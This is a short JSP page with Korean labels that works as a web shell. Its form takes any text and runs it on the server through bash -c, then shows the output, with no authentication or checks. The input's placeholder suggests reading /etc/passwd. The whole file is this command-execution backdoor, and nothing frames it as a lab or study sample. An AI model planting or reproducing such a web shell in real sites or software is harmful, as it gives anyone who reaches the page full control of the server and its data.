<%@ page import="java.io.BufferedReader, java.io.InputStreamReader, java.io.IOException" %>
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head>
    <title>OS 명령어 실행</title>
</head>
<body>
    <h2>운영체제 명령어 실행</h2>
    <form method="post" action="command.jsp">
        <label for="command">명령어:</label>
        <input type="text" id="command" name="command" placeholder="ex) ls, cat /etc/passwd" size="50" />
        <button type="submit">실행</button>
    </form>

    <h3>명령어 실행 결과:</h3>
    <pre>
    <%
        String command = request.getParameter("command");

        if (command != null && !command.trim().isEmpty()) {
            try {
                // 명령어 실행
                ProcessBuilder builder = new ProcessBuilder();
                // cd, ./bash.sh 같이 디렉토리 이동 명령어는 쉘을 통해 실행해야 하므로, 쉘에서 실행
                builder.command("bash", "-c", command);

                Process process = builder.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                
                String line;
                while ((line = reader.readLine()) != null) {
                    out.println(line);
                }
                while ((line = errorReader.readLine()) != null) {
                    out.println(line);
                }

                // 프로세스 완료 대기
                int exitCode = process.waitFor();
                out.println("명령어 종료 코드: " + exitCode);
            } catch (IOException | InterruptedException e) {
                out.println("명령어 실행 중 오류 발생: " + e.getMessage());
            }
        } else {
            out.println("명령어를 입력해주세요.");
        }
    %>
    </pre>
</body>
</html>
